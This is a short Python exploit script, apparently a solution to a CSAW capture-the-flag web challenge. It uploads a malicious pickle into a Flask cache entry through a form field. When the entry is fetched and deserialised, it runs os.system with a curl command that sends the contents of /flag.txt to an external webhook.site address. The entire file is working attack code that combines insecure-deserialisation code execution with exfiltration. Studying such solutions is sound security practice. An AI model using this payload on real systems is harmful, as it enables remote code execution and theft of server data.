from pwn import *
import os
import pickle
import requests

CMD = 'curl https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd --data "cmd=$(cat /flag.txt)"'
url = 'http://web.chal.csaw.io:5000/'
# Doesn't matter from test0 to test30
cache_target = 'test4'

class RunCmd(object):
	def __reduce__(self):
		return(os.system, (CMD,))

payload = b'!' + pickle.dumps(RunCmd())
files = {'content': payload}
data = {'title': 'flask_cache_view//' + cache_target}
r = requests.post(url, data=data, files=files)
log.success("Exploit payload uploaded")

log.success("Triggering exploit")
r = requests.get(url + '/' + cache_target)